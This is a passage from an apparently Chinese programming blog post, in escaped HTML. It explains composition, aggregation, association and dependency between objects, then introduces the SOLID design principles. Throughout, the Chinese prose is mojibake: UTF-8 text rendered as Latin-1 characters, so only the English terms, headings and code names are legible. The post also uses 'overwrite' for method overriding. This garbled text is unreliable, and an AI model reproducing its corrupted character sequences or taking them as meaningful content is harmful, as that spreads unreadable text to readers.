&lt;dd>åˆæˆï¼Œè¿™ä¸ªæ˜¯é™¤äº†ç»§æ‰¿ä»¥å¤–ï¼Œä¸¤ä¸ªå¯¹è±¡ä¹‹é—´æ‰€èƒ½æœ‰çš„æœ€å¼ºçš„å…³ç³»ã€‚åˆæˆæ„å‘³ç€ï¼š
&lt;ul>
&lt;li>&lt;code>Eye&lt;/code> is a part of &lt;code>Dog&lt;/code>, å³ &lt;code>Eye&lt;/code> æ˜¯ &lt;code>Dog&lt;/code> ä¸å¯åˆ†å‰²çš„ä¸€éƒ¨åˆ†ã€‚&lt;/li>
&lt;li>&lt;code>Eye&lt;/code> çš„ç”Ÿå‘½å‘¨æœŸå®Œä¸”ç”± &lt;code>Dog&lt;/code> æ§åˆ¶ï¼Œ &lt;code>Dog&lt;/code> æ¶ˆå¤±åˆ™ &lt;code>Eye&lt;/code> ä¹Ÿä¸å¤å­˜åœ¨ã€‚&lt;/li>
&lt;/ul>
&lt;p>ä»å®ç°ä¸Šæ¥è¯´ï¼Œä¸€èˆ¬ &lt;code>Eye&lt;/code> å¯¹è±¡ä½œä¸º &lt;code>Dog&lt;/code> çš„ä¸€ä¸ªæˆå‘˜å˜é‡ï¼Œä¸”ç”± &lt;code>Dog&lt;/code> è´Ÿè´£ &lt;code>Eye&lt;/code> çš„åˆ›å»ºåŠå…¶å®Œæ•´çš„ç”Ÿå‘½å‘¨æœŸç®¡ç†ã€‚&lt;/p>
&lt;/dd>
&lt;dt>Aggregation&lt;/dt>
&lt;dd>èšåˆï¼Œå…³ç³»å¼ºåº¦æ¬¡äº &lt;em>Composition&lt;/em> ã€‚å…¶å«ä¹‰å¦‚ä¸‹ï¼š
&lt;ul>
&lt;li>ç­çº§ç”±å…¨ç­å­¦ç”Ÿç»„æˆï¼Œä½†å­¦ç”Ÿä¸æ˜¯ç­çº§ä¸å¯åˆ†å‰²çš„ä¸€éƒ¨åˆ†ï¼ˆå› ä¸ºå­¦ç”Ÿå¯ä»¥è½¬å­¦ï¼Œä½†æ˜¯ç­çº§ä¼šä¸€ç›´å­˜åœ¨ï¼‰ã€‚&lt;/li>
&lt;li>ä¸¤è€…çš„ç”Ÿå‘½å‘¨æœŸä¹Ÿä¸éœ€è¦å®Œä¸”ä¸€è‡´ã€‚ä¸€æ–¹é¢ï¼Œå­¦ç”Ÿå¯ä»¥è¾å­¦æˆ–è€…è½¬å­¦ï¼Œä½†ç­çº§ä¸å—å½±å“ï¼›å¦ä¸€æ–¹é¢ï¼Œç­çº§ä¹Ÿå¯ä»¥è§£æ•£æˆ–é‡ç»„ï¼ˆæ¯”å¦‚åˆå¹¶åˆ°å…¶ä»–ç­ï¼‰ï¼Œä½†å­¦ç”Ÿä»ç„¶å­˜åœ¨ã€‚&lt;/li>
&lt;/ul>
&lt;p>ä»å®ç°ä¸Šæ¥è¯´ï¼Œ &lt;code>Student&lt;/code> å¯¹è±¡ç”± &lt;code>Class&lt;/code> å¯¹è±¡æ‰€æŒæœ‰ï¼Œä¸”ä¸€èˆ¬æ˜¯é€šè¿‡ &lt;code>Class&lt;/code> çš„ä¸€ä¸ªé›†åˆç±»æˆå‘˜å˜é‡æ‰€æŒæœ‰ã€‚&lt;/p>
&lt;/dd>
&lt;dt>Association&lt;/dt>
&lt;dd>å…³è”ï¼Œå…³ç³»å¼ºåº¦å†æ¬¡ä¹‹ã€‚å…¶ä»…ä»…æ„å‘³ç€ &lt;em>Has-A&lt;/em> çš„å…³ç³»ã€‚å•ä»å¯¹è±¡æŒæœ‰çš„è§’åº¦çœ‹ï¼Œå’Œ &lt;em>Aggregation&lt;/em> çš„å·®åˆ«ä¸å¤§ï¼Œæˆ‘ä¸ªäººè§‰å¾—ä¸»è¦çš„åŒºåˆ«å¯èƒ½æœ‰å¦‚ä¸‹å‡ ç‚¹ï¼š
&lt;ul>
&lt;li>&lt;em>Aggregation&lt;/em> ä¼šæ›´å¼ºè°ƒâ€œé›†ä½“ï¼ä¸ªä½“â€çš„å…³ç³»ä¸€äº›ï¼Œä¸€èˆ¬æ¥è¯´éšå«äº†â€œä¸€å¯¹å¤šâ€çš„æ„æ€ã€‚&lt;/li>
&lt;li>&lt;em>Association&lt;/em> æ˜¯ä¸€ç§æ›´åŠ é€šç”¨çš„â€œå¯¹è±¡é—´æŒæœ‰å…³ç³»â€çš„æè¿°ï¼ŒèŒƒå›´ä¼šæ¯” Aggregation æ›´å¹¿ã€‚äº‹å®ä¸Šï¼Œ &lt;em>Aggregation&lt;/em> å¯ä»¥çœ‹ä½œæ˜¯ &lt;em>Association&lt;/em> çš„ä¸€ç§ç‰¹ä¾‹ã€‚&lt;/li>
&lt;/ul>
&lt;p>ä»å®ç°ä¸Šæ¥è¯´ï¼Œ &lt;code>VideoEditor&lt;/code> ä¼šæŒæœ‰ä¸€ä¸ª &lt;code>MediaCodec&lt;/code>, ä¸€èˆ¬æ˜¯é€šè¿‡ä¸€ä¸ªæˆå‘˜å˜é‡æ¥æŒæœ‰ã€‚&lt;/p>
&lt;/dd>
&lt;dt>Dependency&lt;/dt>
&lt;dd>ä¾èµ–ï¼Œè¿™ä¸ªåº”è¯¥æ˜¯å¼ºåº¦æœ€å¼±çš„ä¸€ç§å…³ç³»äº†ï¼Œä»…è¡¨ç¤ºä¸¤è€…ä¹‹é—´å­˜åœ¨ä¾èµ–å…³ç³»ï¼Œä½†å¹¶ä¸é™å®šä¸¤è€…ä¹‹é—´æ˜¯å¦‚ä½•ä¾èµ–çš„ã€‚ä¾‹å¦‚ï¼Œæœ€å¼±çš„ä¸€ç§ä¾èµ–å¯èƒ½æ˜¯åœ¨ A å¯¹è±¡æ‰€å±çš„ç±»çš„æŸä¸ªæ–¹æ³•é‡Œé¢ä½¿ç”¨åˆ°äº† B ç±»ã€‚æ­£å¦‚å›¾ä¸­çš„ç¤ºä¾‹ï¼Œè§†é¢‘ç¼–è¾‘å™¨åœ¨åŠ è½½æŸå¼ å›¾ç‰‡ç´ æçš„æ—¶å€™ï¼Œå¯èƒ½åœ¨ &lt;code>loadImage()&lt;/code> æ–¹æ³•ä¸­ä½¿ç”¨äº† &lt;code>ImageDecoder&lt;/code>, ä½†å¹¶ä¸ä¼šåœ¨æˆå‘˜å˜é‡ä¸­æŒæœ‰è¯¥å¯¹è±¡çš„å¼•ç”¨ã€‚&lt;/dd>
&lt;/dl>
&lt;p>ä¸‹é¢è¿™å¼ å›¾å±•ç¤ºäº† &lt;em>Association&lt;/em>, &lt;em>Composition&lt;/em>, &lt;em>Aggregation&lt;/em> ä¸‰è€…ä¹‹é—´çš„å…³ç³»ï¼š&lt;/p>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/relationships-venn.png">
&lt;/figure>
&lt;h2 id="è®¾è®¡åŸåˆ™">è®¾è®¡åŸåˆ™&lt;/h2>
&lt;h3 id="solid-åŸåˆ™">SOLID åŸåˆ™&lt;/h3>
&lt;p>&lt;strong>SOLID&lt;/strong> æŒ‡é¢å‘å¯¹è±¡è®¾è®¡çš„äº”ä¸ªåŸºæœ¬åŸåˆ™ï¼š&lt;/p>
&lt;ul>
&lt;li>&lt;strong>S&lt;/strong>â€‹ingle-responsibility Principle å•ä¸€èŒè´£åŸåˆ™&lt;/li>
&lt;li>&lt;strong>O&lt;/strong>â€‹pen-closed Principle å¼€é—­åŸåˆ™&lt;/li>
&lt;li>&lt;strong>L&lt;/strong>â€‹iskov Substitution Principle é‡Œæ°æ›¿æ¢åŸåˆ™&lt;/li>
&lt;li>&lt;strong>I&lt;/strong>â€‹nterface Segregation Principle æ¥å£éš”ç¦»åŸåˆ™&lt;/li>
&lt;li>&lt;strong>D&lt;/strong>â€‹ependency Inversion Principle ä¾èµ–å€’ç½®åŸåˆ™&lt;/li>
&lt;/ul>
&lt;p>ä¸‹é¢å¯¹è¿™äº”ä¸ªåŸºæœ¬åŸåˆ™é€ä¸€è¿›è¡Œä»‹ç»ã€‚&lt;/p>
&lt;h4 id="single-responsibility-principle-å•ä¸€èŒè´£åŸåˆ™">Single-responsibility Principle å•ä¸€èŒè´£åŸåˆ™&lt;/h4>
&lt;blockquote>
&lt;p>&lt;em>ä¸€ä¸ªç±»åº”è¯¥åªå¯¹ä¸€ä»¶äº‹æƒ…è´Ÿè´£ã€‚&lt;/em>&lt;/p>
&lt;/blockquote>
&lt;p>æ¢å¥è¯è¯´ï¼Œå°±æ˜¯â€‹&lt;strong>ä¸€ä¸ªç±»åº”è¯¥åªæœ‰ä¸€ä¸ªå¼•èµ·å˜åŒ–çš„åŸå› &lt;/strong>â€‹ã€‚&lt;/p>
&lt;p>æˆ‘ä»¬çŸ¥é“ï¼Œå¯¹ç°æœ‰ä»£ç è¿›è¡Œä¿®æ”¹æ˜¯å¾ˆå®¹æ˜“å¼•èµ·é—®é¢˜çš„ã€‚å¦‚æœä¸€ä¸ªç±»å…·æœ‰ä¸¤ä¸ªæˆ–æ›´å¤šçš„å¼•èµ·ä¿®æ”¹çš„åŸå› ï¼Œé‚£ä¹ˆå°†æ¥è¿™ä¸ªç±»å˜åŒ–çš„å‡ ç‡å°†ä¼šå¤§å¤§ä¸Šå‡ã€‚è€Œä¸”å½“å®ƒçœŸæ­£è¢«ä¿®æ”¹æ—¶ï¼Œä½ è®¾è®¡ä¸­çš„ä¸¤ä¸ªæˆ–å¤šä¸ªæ–¹é¢éƒ½ä¼šå—åˆ°å½±å“ï¼ˆå–å†³äºè¯¥ç±»çš„èŒè´£æ•°é‡ï¼‰ï¼Œä¸å¯æ§å› ç´ ä¼šè¿›ä¸€æ­¥æé«˜ã€‚åŒæ—¶ï¼ŒèŒè´£è¿‡å¤šä¹Ÿä¼šå¢åŠ åç»­ç»´æŠ¤äººå‘˜çš„ç†è§£æˆæœ¬ã€‚&lt;/p>
&lt;p>ä¸¾ä¸ªä¾‹å­ï¼Œæ¯”å¦‚è®¾è®¡æ¨¡å¼ä¸­çš„&lt;a href="https://mincodes.com/posts/design-patterns-behavioral/#è¿­ä»£å™¨--iterator">è¿­ä»£å™¨æ¨¡å¼&lt;/a>ï¼Œå°±å¸®åŠ©æˆ‘ä»¬æŠŠå¯¹é›†åˆçš„éå†æ“ä½œè¿™é¡¹èŒè´£ç»™å‰¥ç¦»å‡ºæ¥ï¼Œä½¿å¾—é›†åˆå†…éƒ¨åªéœ€å…³å¿ƒé›†åˆè‡ªèº«åŠŸèƒ½çš„å®ç°ï¼Œè€Œæ— éœ€æ“å¿ƒå¦‚ä½•éå†é›†åˆå…ƒç´ è¿™é¡¹åŠŸèƒ½ã€‚ç›¸åï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥åœ¨é›†åˆå†…éƒ¨å®ç°è¿­ä»£åŠŸèƒ½ï¼Œé‚£æˆ‘ä»¬å°±ç»™äº†è¿™ä¸ªç±»ä¸¤ä¸ªå˜åŒ–çš„åŸå› ï¼š&lt;/p>
&lt;ol>
&lt;li>å¦‚æœé›†åˆæœ¬èº«çš„åŠŸèƒ½ï¼ˆä¾‹å¦‚å…ƒç´ çš„å­˜å‚¨ç»“æ„æˆ–æ“ä½œï¼‰å‘ç”Ÿæ”¹å˜ï¼Œè¿™ä¸ªç±»ä¼šè¢«ä¿®æ”¹ï¼›&lt;/li>
&lt;li>å¦‚æœéå†çš„æ–¹å¼å‘ç”Ÿæ”¹å˜ï¼Œè¿™ä¸ªç±»ä¹Ÿä¼šè¢«ä¿®æ”¹ã€‚&lt;/li>
&lt;/ol>
&lt;p>å› æ­¤ï¼Œè¿™ä¸ªç±»å°†æ¥è¢«ä¿®æ”¹çš„æœºç‡å¤§å¹…ä¸Šå‡ï¼Œå¢åŠ äº†ä»£ç çš„ä¸ç¨³å®šå› ç´ ã€‚å¦å¤–ï¼Œç”±äºè¿™ä¸¤é¡¹åŠŸèƒ½æ”¾åœ¨ä¸€èµ·å®ç°ï¼Œå½¼æ­¤ä¹‹é—´å¾ˆå¯èƒ½ä¼šå‘ç”Ÿäº’ç›¸è€¦åˆï¼Œä¿®æ”¹å…¶ä¸­ä¸€é¡¹å¯èƒ½ä¼šå¯¼è‡´å¦ä¸€é¡¹ä¹Ÿéœ€è¦ä¿®æ”¹ï¼Œä»è€Œå¢åŠ ä¿®æ”¹çš„å¤æ‚åº¦å’Œå‡ºé”™çš„æ¦‚ç‡ã€‚&lt;/p>
&lt;p>è®¾è®¡æ¨¡å¼ä¸­è¿˜æœ‰å¾ˆå¤šæ¨¡å¼éƒ½éµå®ˆäº†å•ä¸€èŒè´£åŸåˆ™ï¼Œä¾‹å¦‚&lt;a href="https://mincodes.com/posts/design-patterns-creational/#æŠ½è±¡å·¥å‚--abstract-factory">æŠ½è±¡å·¥å‚&lt;/a>å°†äº§å“å¯¹è±¡çš„æ„é€ è¿™ä¸€èŒè´£ç‹¬ç«‹å‡ºæ¥ï¼Œå®¢æˆ·çš„å¯ä»¥ç›´æ¥é€šè¿‡å·¥å‚æ¥å£æ‹¿åˆ°äº§å“æ¥å£ï¼Œè€Œæ— éœ€å…³å¿ƒå…·ä½“äº§å“æ˜¯å¦‚ä½•å®ç°ä»¥åŠå¦‚ä½•å®ä¾‹åŒ–çš„ï¼›å†æ¯”å¦‚&lt;a href="https://mincodes.com/posts/design-patterns-structural/#æ¡¥æ¥--bridge">æ¡¥æ¥æ¨¡å¼&lt;/a>ï¼Œå°†æŠ½è±¡çš„è®¾è®¡éƒ¨åˆ†å’Œå®ƒæ‰€å€šèµ–çš„å®ç°éƒ¨åˆ†åˆ†ç¦»ï¼Œä½¿äºŒè€…å¯ä»¥ç‹¬ç«‹å‘ç”Ÿå˜åŒ–ï¼Œç­‰ç­‰ã€‚&lt;/p>
&lt;p>å¦ä¸€ä¸ªå¾ˆæœ‰ç”¨çš„æ¦‚å¿µæ˜¯åˆ†ç¦»å…³æ³¨ç‚¹ï¼Œè¿™ä¸ªæ¦‚å¿µå’Œå•ä¸€èŒè´£åŸåˆ™æœ‰ç‚¹ç±»ä¼¼ï¼Œä½†æ˜¯è§’åº¦ä¸å¤ªä¸€æ ·ã€‚å…·ä½“æˆ‘ä»¬åœ¨&lt;a href="https://mincodes.com/posts/design-patterns/#separation-of-concerns-%E5%88%86%E7%A6%BB%E5%85%B3%E6%B3%A8%E7%82%B9">åˆ†ç¦»å…³æ³¨ç‚¹&lt;/a>ç« èŠ‚ä¸­è¿›ä¸€æ­¥è®¨è®ºã€‚&lt;/p>
&lt;h4 id="open-closed-principle-å¼€é—­åŸåˆ™">Open-closed Principle å¼€é—­åŸåˆ™&lt;/h4>
&lt;blockquote>
&lt;p>ç³»ç»Ÿåº”è¯¥å¯¹æ‰©å±•å¼€æ”¾ï¼Œå¯¹ä¿®æ”¹å…³é—­ã€‚&lt;/p>
&lt;/blockquote>
&lt;p>è¿™é‡Œçš„å…³é”®è¯æ˜¯â€œä¿®æ”¹â€ã€‚è½¯ä»¶ä¹‹æ‰€ä»¥è¦åšè®¾è®¡ï¼Œå¾ˆå¤§ç¨‹åº¦ä¸Šå°±æ˜¯å› ä¸ºéœ€è¦åº”å¯¹æœªæ¥çš„ä¿®æ”¹ï¼Œæ¢å¥è¯è¯´ï¼Œéœ€è¦åº”å¯¹æœªæ¥çš„å˜åŒ–ã€‚è¿™ç§å˜åŒ–åŒ…æ‹¬æ–°å¢éœ€æ±‚ä»¥åŠå¯¹ç°æœ‰éœ€æ±‚çš„ä¿®æ”¹ã€‚&lt;/p>
&lt;p>ä¸ºäº†é€‚åº”è¿™ç§å˜åŒ–ï¼Œå¹¶ä¸”åœ¨é€‚åº”å˜åŒ–çš„åŒæ—¶ï¼Œä¿æŒç³»ç»Ÿçš„å¥å£®æ€§ï¼Œæˆ‘ä»¬å¿…é¡»è€ƒè™‘ç³»ç»Ÿåœ¨å®ƒçš„ç”Ÿå‘½å‘¨æœŸå†…ä¼šå‘ç”Ÿæ€æ ·çš„å˜åŒ–ã€‚ä¸€ä¸ªä¸è€ƒè™‘å˜åŒ–çš„è®¾è®¡ï¼Œåœ¨å°†æ¥å¾ˆå¯èƒ½éœ€è¦å¤§è§„æ¨¡é‡æ„ï¼Œè¿™æ„å‘³ç€é‡æ–°è®¾è®¡ã€å¼€å‘å’Œæµ‹è¯•ï¼Œä»¥åŠä¾èµ–æ–¹çš„ä¿®æ”¹ï¼Œè¿™ç§ä»£ä»·æ˜¯ååˆ†å·¨å¤§çš„ã€‚&lt;/p>
&lt;p>åšæŒå¼€é—­åŸåˆ™ä¸ä½†èƒ½å¤Ÿå¸®åŠ©æˆ‘ä»¬æ›´å¥½çš„é€‚åº”å˜åŒ–ï¼Œè€Œä¸”è¿˜æœ‰åŠ©äºæˆ‘ä»¬å»ºç«‹èµ·ç¨³å®šä¸”é«˜è´¨é‡çš„ã€è´§æ¶äº§å“ã€ã€‚è¯•æƒ³ä¸€ä¸‹ï¼Œå¦‚æœæˆ‘ä»¬çš„ç»„ä»¶å¼€å‘å‡ºæ¥ä¹‹åï¼Œä¸éœ€è¦å› ä¸ºå®¢æˆ·çš„éœ€æ±‚è€Œæ—¶å¸¸å‘ç”Ÿä¿®æ”¹ï¼ˆåªæœ‰æ—¥å¸¸ç»´æŠ¤ã€bugfixï¼‰ï¼Œåœ¨å®¢æˆ·æœ‰æ–°çš„éœ€æ±‚æ—¶ï¼Œéƒ½æ˜¯é€šè¿‡æ‰©å±•ç°æœ‰ç»„ä»¶ï¼ˆç»§æ‰¿æˆ–ç»„åˆï¼‰ã€æ–°å¢ç»„ä»¶çš„æ–¹å¼æ¥æ»¡è¶³å®¢æˆ·è¯‰æ±‚ï¼Œé‚£ä¹ˆéšç€æ—¶é—´çš„æ¨ç§»ï¼Œçº¿ä¸Šçš„åœºæ™¯éªŒè¯ã€çº¿ä¸‹çš„æµ‹è¯•è¦†ç›–ä¼šè¶Šæ¥è¶Šå¤šï¼Œç°å­˜ç»„ä»¶çš„è´¨é‡å’Œç¨³å®šæ€§ä¼šè¶Šæ¥è¶Šé«˜ï¼ˆå› ä¸º bugfix åœ¨æŒç»­è¿›è¡Œï¼Œä¸”æ²¡æœ‰å¼•å…¥æ–°çš„ä¿®æ”¹ç‚¹ï¼‰ã€‚è¿™æ ·æŒç»­å‘å±•ä¸‹å»ï¼Œæˆ‘ä»¬å°±å¯ä»¥å»ºç«‹ä¸€ä¸ªé«˜è´¨é‡çš„ç»„ä»¶åº“ï¼Œå³æˆ‘ä»¬è¯´çš„ã€è´§æ¶äº§å“ã€ã€‚&lt;/p>
&lt;p>å½“ç„¶ï¼Œè¦åšåˆ°è¿™ä¸€ç‚¹å¹¶ä¸å®¹æ˜“ã€‚è¿™é‡Œæ•´ç†ä¸€ä¸ªå¤§è‡´çš„æ€è·¯ä¾›å‚è€ƒï¼š&lt;/p>
&lt;ul>
&lt;li>
&lt;p>&lt;strong>æ‰¾å‡ºæ½œåœ¨çš„å˜åŒ–ç‚¹&lt;/strong>â€‹ã€‚åœ¨è®¾è®¡ä¹‹åˆï¼Œä»éœ€æ±‚è§’åº¦å‡ºå‘ï¼Œè€ƒå¯Ÿæ¨¡å—ä¸­å“ªäº›éƒ¨åˆ†å°†æ¥å¯èƒ½ä¼šå‘ç”Ÿå˜åŒ–ï¼ŒæŠŠè¿™äº›æ½œåœ¨çš„å˜åŒ–ç‚¹æ‰¾å‡ºæ¥ã€‚&lt;/p>
&lt;/li>
&lt;li>
&lt;p>&lt;strong>å¯¹å˜åŒ–è¿›è¡Œå°è£…å’Œéš”ç¦»&lt;/strong>â€‹ã€‚å˜åŒ–ç‚¹æ‰¾å‡ºæ¥ä¹‹åï¼Œæ€è€ƒä¸€ä¸‹ï¼Œå°†æ¥è¿™äº›å˜åŒ–çœŸæ­£æ¥ä¸´çš„æ—¶å€™ï¼Œæˆ‘ä»¬ä¼šå¦‚ä½•æ”¯æŒï¼Ÿ&lt;/p>
&lt;p>æ˜¯å¦å¯ä»¥åœ¨ä¸ä¿®æ”¹ç°æœ‰æ¨¡å—ä»£ç çš„å‰æä¸‹ï¼ˆå¯ä»¥æ–°å¢ä»£ç ï¼Œä¾‹å¦‚æ–°å†™ä¸€ä¸ªç±»ï¼‰ï¼Œé€šè¿‡æŸç§æœºåˆ¶ä¼˜é›…çš„æ”¯æŒè¿™ç§å˜åŒ–ï¼Ÿä¾‹å¦‚åœ¨è¿è¡Œæ—¶æ›¿æ¢æŸä¸ªå¯¹è±¡ï¼Œæˆ–è€…æ–°å¢ä¸€ä¸ªå­ç±»æ¥è‡ªå®šä¹‰åŸºç±»çš„éƒ¨åˆ†è¡Œä¸ºï¼Ÿæƒ³æ¸…æ¥šè¿™ç‚¹ä¹‹åï¼Œæˆ‘ä»¬å°±å®ç°äº†å¯¹å˜åŒ–è¿›è¡Œå°è£…å’Œéš”ç¦»ã€‚&lt;/p>
&lt;/li>
&lt;/ul>
&lt;p>ä¸Šé¢æ˜¯ä¸€ä¸ªæ€è·¯ï¼Œå…·ä½“åº”è¯¥å¦‚ä½•åšå‘¢ï¼Ÿ è®¾è®¡æ¨¡å¼ä¸ºæˆ‘ä»¬æŒ‡æ˜äº†é“è·¯ã€‚&lt;/p>
&lt;p>â€‹&lt;strong>è®¾è®¡æ¨¡å¼å¯ä»¥ç¡®ä¿ç³»ç»Ÿèƒ½å¤Ÿä»¥æŸç§ç‰¹å®šçš„æ–¹å¼å‘ç”Ÿå˜åŒ–&lt;/strong>â€‹ï¼Œä»è€Œå¸®åŠ©ä½ åœ¨é¢ä¸´è¿™ç§å˜åŒ–æ—¶é¿å…é‡æ–°è®¾è®¡ã€‚æ¯ä¸€ä¸ªè®¾è®¡æ¨¡å¼éƒ½å…è®¸ç³»ç»Ÿç»“æ„çš„æŸä¸ªæ–¹é¢çš„å˜åŒ–ç‹¬ç«‹äºå…¶ä»–æ–¹é¢ï¼Œè¿™æ ·äº§ç”Ÿçš„ç³»ç»Ÿå¯ä»¥æ›´å¥½åœ°é€‚åº”è¿™ç§å˜åŒ–ï¼Œä»è€Œæ›´åŠ å¥å£®ã€‚è¿›ä¸€æ­¥çš„é˜è¿°è§&lt;a href="https://mincodes.com/posts/design-patterns/#%E5%B8%B8%E8%A7%81%E7%9A%84%E8%AE%BE%E8%AE%A1%E9%97%AE%E9%A2%98%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%A8%A1%E5%BC%8F%E5%BA%94%E7%94%A8">å¸¸è§çš„è®¾è®¡é—®é¢˜åŠç›¸å…³æ¨¡å¼åº”ç”¨&lt;/a>ã€&lt;a href="https://mincodes.com/posts/design-patterns/#%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%89%80%E6%94%AF%E6%8C%81%E7%9A%84%E8%AE%BE%E8%AE%A1%E7%9A%84%E5%8F%AF%E5%8F%98%E6%96%B9%E9%9D%A2">è®¾è®¡æ¨¡å¼æ‰€æ”¯æŒçš„è®¾è®¡çš„å¯å˜æ–¹é¢&lt;/a>ä¸¤èŠ‚ã€‚&lt;/p>
&lt;p>ä¸€æ¬¾ä¸èƒ½é€‚åº”å˜åŒ–çš„è½¯ä»¶æ˜¯æ²¡æœ‰ç”Ÿå‘½åŠ›çš„ï¼Œè€Œä¸”æ³¨å®šä¼šä»¥å¤±è´¥å‘Šç»ˆï¼Œè®©æˆ‘ä»¬ç§¯ææ‹¥æŠ±å˜åŒ–ğŸ˜ã€‚&lt;/p>
&lt;h4 id="liskov-substitution-principle-é‡Œæ°æ›¿æ¢åŸåˆ™">Liskov Substitution Principle é‡Œæ°æ›¿æ¢åŸåˆ™&lt;/h4>
&lt;blockquote>
&lt;p>åŸºç±»å¯¹è±¡åº”è¯¥å¯ä»¥è¢«å­ç±»å¯¹è±¡æ— ç¼æ›¿æ¢ã€‚&lt;/p>
&lt;/blockquote>
&lt;p>é™¤äº†æ˜æ˜¾çš„å­—é¢æ„æ€ï¼Œè¿™é‡Œä»ã€åŸºç±»è®¾è®¡è€…ã€å’Œã€å­ç±»å®ç°è€…ã€ä¸¤ä¸ªè§’åº¦ï¼Œè¡¥å……ä¸€ç‚¹ä¸ªäººçš„ç†è§£ã€‚&lt;/p>
&lt;dl>
&lt;dt>åŸºç±»è®¾è®¡è§’åº¦&lt;/dt>
&lt;dd>åŸºç±»åœ¨è®¾è®¡æ—¶ï¼Œåº”è¯¥æ…é‡å®šä¹‰å¯é‡å†™ï¼ˆ &lt;code>overwrite&lt;/code> ï¼‰æ–¹æ³•ã€‚æ¯ä¸ª &lt;code>overwrite&lt;/code> æ–¹æ³•éƒ½åº”è¯¥æœ‰æ˜ç¡®çš„è®¾è®¡æ„å›¾ã€‚
&lt;p>åŸºç±»å®šä¹‰çš„æ¯ä¸€ä¸ª &lt;code>overwrite&lt;/code> æ–¹æ³•ï¼Œéƒ½åº”è¯¥æ˜¯æœ‰æ„ä¸ºä¹‹ï¼Œä¸èƒ½éšä¾¿å®šä¹‰ã€‚ä¾‹å¦‚ï¼Œæ¨¡æ¿æ–¹æ³•ä¸­å¼€æ”¾å‡ºæ¥çš„ &lt;code>overwrite&lt;/code> æ–¹æ³•ï¼Œæ˜¯æœ‰æ„è®©å­ç±»é‡å†™æ•´ä¸ªç®—æ³•æµç¨‹ä¸­çš„æŸäº›æ­¥éª¤ã€‚&lt;/p>
&lt;p>æ…é‡å®šä¹‰ &lt;code>overwrite&lt;/code> æ–¹æ³•ï¼Œå¯ä»¥æœ‰æ•ˆé˜²æ­¢ &lt;code>overwrite&lt;/code> æ–¹æ³•è¯­ä¹‰æ··ä¹±ã€ç”¨é€”ä¸æ˜ç¡®ä»¥åŠå­ç±»é”™è¯¯é‡å†™çš„é—®é¢˜ï¼Œä¹Ÿå¯ä»¥é™ä½å­ç±»å®ç°è€…çš„å¿ƒæ™ºè´Ÿæ‹…ã€‚&lt;/p>
&lt;/dd>
&lt;dt>å­ç±»å®ç°è§’åº¦&lt;/dt>
&lt;dd>å­ç±»åœ¨å®ç°æ—¶ï¼Œåº”è¯¥ç†è§£åŸºç±»çš„å·¥ä½œæœºåˆ¶ï¼Œéµå®ˆåŸºç±»çš„è®¾è®¡æ„å›¾ï¼Œä¸¥æ ¼æŒ‰ç…§ç»§æ‰¿åè®®æ¥é‡å†™ &lt;code>overwrite&lt;/code> æ–¹æ³•ï¼Œå¹¶ç¡®ä¿éµå¾ªé‡Œæ°æ›¿æ¢åŸåˆ™ã€‚&lt;/dd>
&lt;/dl>
&lt;h4 id="interface-segregation-principle-æ¥å£éš”ç¦»åŸåˆ™">Interface Segregation Principle æ¥å£éš”ç¦»åŸåˆ™&lt;/h4>
&lt;blockquote>
&lt;p>æä¾›å¤šä¸ªåˆ†ç¦»çš„æ¥å£ï¼Œè€Œéæä¾›ä¸€ä¸ªå®½æ³›ç”¨é€”çš„æ¥å£ã€‚&lt;/p>
&lt;/blockquote>
&lt;p>æä¾›éš”ç¦»çš„æ¥å£è‡³å°‘æœ‰ä¸¤æ–¹é¢çš„å¥½å¤„ï¼š&lt;/p>
&lt;ul>
&lt;li>ä»ä½¿ç”¨è€…çš„è§’åº¦è®²ï¼Œäº’ç›¸éš”ç¦»æ¥å£çš„æ¥å£ç›¸è¾ƒä¸€ä¸ªå¤§è€Œå…¨çš„æ¥å£ï¼Œä½¿ç”¨èµ·æ¥æ›´åŠ ç®€å•ã€é«˜æ•ˆï¼Œå¯ä»¥æœ‰æ•ˆå‡å°‘è¯¯ç”¨ï¼ŒåŒæ—¶é™ä½ä½¿ç”¨è€…çš„å¿ƒæ™ºè´Ÿæ‹…ï¼›&lt;/li>
&lt;li>ä»è®¾è®¡è€…çš„è§’åº¦è®²ï¼Œæä¾›ç›¸äº’éš”ç¦»çš„æ¥å£é™¤äº†æœ‰åˆ©äºä¿æŒç»„ä»¶æ¥å£çš„ç®€æ´æ¸…æ™°ï¼ŒåŒæ—¶è¿˜ä¼šè¿«ä½¿è®¾è®¡è€…æ€è€ƒæ¸…æ¥šç³»ç»Ÿçš„æ ¸å¿ƒï¼ˆåŸå­ï¼‰æ¥å£æ˜¯ä»€ä¹ˆï¼Œä»è€Œåœ¨æœºåˆ¶å±‚é¢å¯¹ç³»ç»Ÿçš„è®¾è®¡æ€è€ƒçš„æ›´åŠ é€å½»ä¸€äº›ï¼Œè€Œä¸æ˜¯ case by case çš„æä¾›ä¸šåŠ¡æ‰€éœ€è¦çš„å„é¡¹åŠŸèƒ½ã€‚&lt;/li>
&lt;/ul>
&lt;p>å®é™…ä¸Šï¼Œç”±äºåˆ†ç¦»æ¥å£ä¹Ÿæ„å‘³ç€åˆ†ç¦»èŒè´£ï¼Œå› æ­¤è¯¥åŸåˆ™ä¹Ÿæš—åˆå•ä¸€èŒè´£åŸåˆ™ã€‚&lt;/p>
&lt;h4 id="dependency-inversion-principle-ä¾èµ–å€’ç½®åŸåˆ™">Dependency Inversion Principle ä¾èµ–å€’ç½®åŸåˆ™&lt;/h4>
&lt;blockquote>
&lt;p>ä¾èµ–æŠ½è±¡ï¼Œä¸è¦ä¾èµ–å…·ä½“å®ç°ã€‚&lt;/p>
&lt;/blockquote>
&lt;ul>
&lt;li>é«˜å±‚ç»„ä»¶ä¸åº”è¯¥ä¾èµ–ä½å±‚ç»„ä»¶&lt;/li>
&lt;li>ä¸ç®¡é«˜å±‚ç»„ä»¶æˆ–ä½å±‚ç»„ä»¶ï¼Œä¸¤è€…éƒ½åº”è¯¥ä¾èµ–æŠ½è±¡ï¼Œè€Œéå…·ä½“å®ç°&lt;/li>
&lt;/ul>
